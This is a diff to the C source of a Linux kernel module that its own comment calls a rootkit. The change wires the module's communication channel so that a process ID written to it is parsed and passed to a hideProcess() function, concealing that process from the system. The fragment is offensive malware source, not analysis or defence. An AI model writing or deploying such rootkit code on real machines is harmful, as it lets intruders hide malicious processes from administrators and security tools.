@@ -3,8 +3,10 @@
 #include <linux/module.h>
 #include <asm/uaccess.h>  //for put_user / get_user
 #include <linux/user.h>
+#include <linux/kernel.h>
 
 #include "communication.h"
+#include "processHider.h"
 #include "common.h"
 
 //TODO: ensure its possible to communicate with the rootkit without being root
@@ -71,6 +73,15 @@ static ssize_t receiveWrite(struct file *file, const char *userBuffer, size_t le
 	kernelBuffer[len] = '\0';
 
 	printInfo("%s", kernelBuffer);
+
+	//
+	//int pidToHide = atoi(kernelBuffer);
+	int pidToHide;
+	sscanf(kernelBuffer, "%d", &pidToHide);
+
+	// probably should ensure process hider init has finished..
+	hideProcess(pidToHide);
+
 
 	return len;
 }
